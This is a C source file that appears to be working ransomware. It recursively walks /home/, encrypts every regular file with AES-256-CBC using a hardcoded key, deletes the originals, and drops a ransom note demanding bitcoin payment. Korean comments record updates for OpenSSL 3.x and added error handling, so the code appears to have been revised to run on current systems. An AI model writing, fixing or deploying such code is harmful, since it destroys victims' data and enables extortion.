#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>


void ls_dir(char* intial_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);


int main()
{
   	
	char* intial_path;
	intial_path = "/home/";
    ls_dir(intial_path);

    return 0;
}

void ls_dir(char* intial_path)
{
	
	// 32 char 256bit key
	unsigned char key[] = "98765432101234567890123456123456";
    // same size as block 16 char 128 bit block
	unsigned char iv[] = "1234567890123456";

	DIR* dir;
	struct dirent *ent;
	if((dir=opendir(intial_path)) !=NULL)
	{
		while((ent=readdir(dir)) !=NULL)
		{
			int len = strlen(ent->d_name);
            // .enc 접미사 확인 시, 파일 이름이 최소 4자 이상인지 확인하는 로직 추가 권장
			const char* last_four = (len >= 4) ? &ent->d_name[len-4] : "";
			if(strcmp(last_four,".enc") != 0)
			{
				if(ent->d_type == DT_REG) // DT_REG (8)은 일반 파일
				{
					// 메모리 할당 크기 조정: 경로 + 파일명/README + NULL 문자 + 안전 여유분
					char* full_path_readme =(char*) malloc(strlen(intial_path) + strlen("RANSOMEWARE_INFO") + 1);
                    if (full_path_readme == NULL) { perror("malloc failed"); continue; }
					strcpy(full_path_readme,intial_path);
					strcat(full_path_readme,"RANSOMEWARE_INFO");
                    
					char* full_path =(char*) malloc(strlen(intial_path) + strlen(ent->d_name) + 1);
                    if (full_path == NULL) { free(full_path_readme); perror("malloc failed"); continue; }
					strcpy(full_path,intial_path);
					strcat(full_path,ent->d_name);
                    
					char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
                    if (new_name == NULL) { free(full_path_readme); free(full_path); perror("malloc failed"); continue; }
					strcpy(new_name,full_path);
					strcat(new_name,".enc");
                    
                    // 핵심 시스템 파일은 암호화하지 않음
					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
					{
						FILE* fpin = NULL;
						FILE* fpout = NULL;
						FILE* fpreadme = NULL;
					
						
						fpin=fopen(full_path,"rb");
						fpout=fopen(new_name,"wb");
						fpreadme=fopen(full_path_readme,"w");
						
                        if (fpin && fpout && fpreadme) {
						    fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
						    
						    encryptfile(fpin,fpout,key,iv);

						    // 파일 닫기
						    fclose(fpin);
						    fclose(fpout);
						    
						    // 암호화 성공 시 원본 파일 삭제
						    remove(full_path);
                        } else {
                            // 파일 열기 실패 시 처리
                            if (fpin) fclose(fpin);
                            if (fpout) fclose(fpout);
                        }
                        if (fpreadme) fclose(fpreadme);
					}
					free(full_path);
					free(new_name);
                    free(full_path_readme);
				}
				else if(ent->d_type == DT_DIR) // DT_DIR (4)은 디렉토리
				{
                    // . (현재 디렉토리) 또는 .. (상위 디렉토리)는 건너뜀
					if(strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue; 
                    
					// 메모리 할당 크기 조정: 경로 + 디렉토리명 + / + NULL 문자
					char *full_path=(char*) malloc(strlen(intial_path)+strlen(ent->d_name)+2);
                    if (full_path == NULL) { perror("malloc failed"); continue; }
					strcpy(full_path,intial_path);
					strcat(full_path,ent->d_name);
					strcat(full_path,"/");
					printf("Entering Directory: %s\n",full_path);

                    // 재귀 호출
                    // full_path != intial_path 대신 적절한 종료 조건을 사용하거나, 
                    // 위에서 .과 ..을 건너뛰는 방식으로 처리
                    ls_dir(full_path);

					free(full_path);
				}

			}
		}
        closedir(dir); // 디렉토리 닫기
	} else {
        perror("Error opening directory");
    }

}
// OpenSSL 3.x 호환성 개선
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
	//Using openssl EVP to encrypt a file

	
	const unsigned bufsize = 4096;
    // 버퍼 할당 실패 처리 추가
	unsigned char* read_buf = malloc(bufsize);
    if (!read_buf) { perror("malloc failed"); return; }
	unsigned char* cipher_buf ;
	int out_len;
    int update_len, final_len;

    // OpenSSL 3.x: EVP_CIPHER_CTX는 포인터로 선언하고 new/free 사용
	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { 
        perror("EVP_CIPHER_CTX_new failed"); 
        free(read_buf); 
        return; 
    }

	// EVP_CipherInit() 대신 EVP_CipherInit_ex() 사용. 마지막 인자 'enc'는 1(암호화)
    // EVP_aes_256_cbc()는 OpenSSL 3.x에서도 계속 사용 가능
	if(1 != EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1)) {
        fprintf(stderr, "EVP_CipherInit_ex failed\n");
        EVP_CIPHER_CTX_free(ctx);
        free(read_buf);
        return;
    }
    
    // 블록 크기를 얻을 필요는 없지만, cipher_buf 할당을 위해 사용 (안전하게 최대 블록 크기 더함)
    const int blocksize = EVP_CIPHER_CTX_get_block_size(ctx); 
    
    // 암호화 출력 버퍼는 입력 크기 + 블록 크기만큼 필요
	cipher_buf = malloc(bufsize + blocksize);
    if (!cipher_buf) { 
        perror("malloc failed"); 
        EVP_CIPHER_CTX_free(ctx); 
        free(read_buf); 
        return; 
    }

	// read file and write encrypted file until eof
	while(1)
	{
		int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
        
        // bytes_read가 0이고 EOF가 아닐 때 오류 처리 (선택 사항)
        if (ferror(fpin)) { 
            perror("Error reading file"); 
            break; 
        }

        if (bytes_read > 0) {
            // bytes_read가 0이 아닐 때만 EVP_CipherUpdate 호출
		    if (1 != EVP_CipherUpdate(ctx, cipher_buf, &update_len, read_buf, bytes_read)) {
                fprintf(stderr, "EVP_CipherUpdate failed\n");
                break;
            }
		    fwrite(cipher_buf,sizeof(unsigned char),update_len,fpout);
        }
        
		if(bytes_read < bufsize)
		{
			break;//EOF
		}
	}
    
    // 마지막 블록 및 패딩 처리
	if (1 != EVP_CipherFinal_ex(ctx, cipher_buf, &final_len)) {
        fprintf(stderr, "EVP_CipherFinal_ex failed\n");
    } else {
        fwrite(cipher_buf,sizeof(unsigned char),final_len,fpout);
    }
    
    // EVP_CIPHER_CTX_cleanup() 대신 EVP_CIPHER_CTX_free()를 사용하여 컨텍스트 해제 및 메모리 정리
	EVP_CIPHER_CTX_free(ctx); 

	free(cipher_buf);
	free(read_buf);
}
